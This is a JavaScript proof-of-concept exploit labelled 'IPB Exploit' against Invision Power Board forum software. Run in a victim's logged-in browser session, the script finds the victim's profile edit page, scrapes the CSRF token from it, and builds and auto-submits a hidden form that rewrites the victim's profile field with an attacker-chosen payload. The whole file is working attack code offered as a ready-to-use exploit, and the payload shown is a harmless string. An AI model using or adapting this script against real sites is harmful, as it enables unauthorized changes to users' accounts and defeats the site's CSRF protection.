/*
www.sxcurity.pro/pocs/lol.js
 _
(_)_ ____      ___ __
| | '_ \ \ /\ / / '_ \
| | |_) \ V  V /| | | |
|_| .__/ \_/\_/ |_| |_|
 |_|  IPB Exploit
      by @sxcurity

index.php?/profile/<user>/&tab=field_core_pfield_1
This will add "sxcurity is my hero" to the user's about me.
*/
var target = 'http://localhost/ips_4141/index.php';
var payload = 'sxcurity is my hero';

// Gets the Profile URL of the victim.
var cdl = get(target);
document.body.innerHTML = cdl;
var user_url = document.getElementsByTagName('a')[13];
var user_url1 = document.getElementsByTagName('a')[14];
var user_url2 = document.getElementsByTagName('a')[15];
var user_url3 = document.getElementsByTagName('a')[16];
var user_url4 = document.getElementsByTagName('a')[17];
var user_url5 = document.getElementsByTagName('a')[18];
var user_url6 = document.getElementsByTagName('a')[19];
var user_url7 = document.getElementsByTagName('a')[20];
var yay = user_url.href;
var yay1 = user_url1.href;
var yay2 = user_url2.href;
var yay3 = user_url3.href;
var yay4 = user_url4.href;
var yay5 = user_url5.href;
var yay6 = user_url6.href;
var yay7 = user_url7.href;
var mod_check0 = document.getElementsByTagName('a')[22];
var mod_check1 = document.getElementsByTagName('a')[22];
var mod_check2 = document.getElementsByTagName('a')[23];
var mod_check3 = document.getElementsByTagName('a')[24];
var mod_check4 = document.getElementsByTagName('a')[25];
var mod_check5 = document.getElementsByTagName('a')[26];
var mod_check6 = document.getElementsByTagName('a')[27];
var check0 = mod_check1.href;
var check1 = mod_check1.href;
var check2 = mod_check2.href;
var check3 = mod_check3.href;
var check4 = mod_check4.href;
var check5 = mod_check5.href;
var check6 = mod_check5.href;


/*
Mods / admins have a different amount of links before their profile URL, so this makes sure
we grab the right profile URL and not some random one!
*/
if (yay.includes("profile")){
  //user = normal user acc.
  var profile = yay;
} else if (yay1.includes("profile")){
  //user = normal user acc.
  var profile = yay1;
} else if (yay2.includes("profile")){
  //user = normal user acc.
  var profile = yay2;
} else if (yay3.includes("profile")){
  //user = normal user acc.
  var profile = yay3;
} else if (yay4.includes("profile")){
  //user = normal user acc.
  var profile = yay4;
} else if (yay5.includes("profile")){
  //user = normal user acc.
  var profile = yay5;
} else if (yay6.includes("profile")){
  //user = normal user acc.
  var profile = yay6;
} else if (yay7.includes("profile")){
  //user = normal user acc.
  var profile = yay7;
} else if (check0.includes("profile")){
  //user = mod or admin
  var profile = check0;
} else if (check2.includes("profile")){
  //user = mod or admin
  var profile = check2;
} else if (check3.includes("profile")){
  //user = mod or admin
  var profile = check3;
} else if (check4.includes("profile")){
  //user = mod or admin
  var profile = check4;
} else if (check5.includes("profile")){
  //user = mod or admin
  var profile = check5;
} else if (check6.includes("profile")){
  //user = mod or admin
  var profile = check6;
}
var final = profile + 'edit/';

// steals the csrf token

var csrf = get(final);
document.body.innerHTML = csrf;
var inp = document.getElementsByTagName('input')[3];
var token = inp.value;

// build form with valid token and evil credentials
document.body.innerHTML
+= '<form id="woot" action=' + final + ' method="POST">'
+ '<input type="hidden" name="form_submitted" value="1">'
+ '<input type="hidden" name="csrfKey" value="' + token + '">'
+ '<input type="hidden" name="MAX_FILE_SIZE" value="2097152">'
+ '<input type="hidden" name="plupload" value="sxcurity">'
+ '<input type="hidden" name="bday[month]" value="0">'
+ '<input type="hidden" name="bday[day]" value="0">'
+ '<input type="hidden" name="bday[year]" value="0">'
+ '<input type="hidden" name="enable_status_updates" value="0">'
+ '<input type="hidden" name="enable_status_updates_checkbox" value="1">'
+ '<input type="hidden" name="core_pfield_1" value="' + payload + '">'
+ '<input type="hidden" name="core_pfield_1_upload" value="sxcurity">'
+ '</form>';

// submits our csrf form!
document.forms["woot"].submit();

function get(url) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", url, false);
    xmlHttp.send(null);
    return xmlHttp.responseText;
}
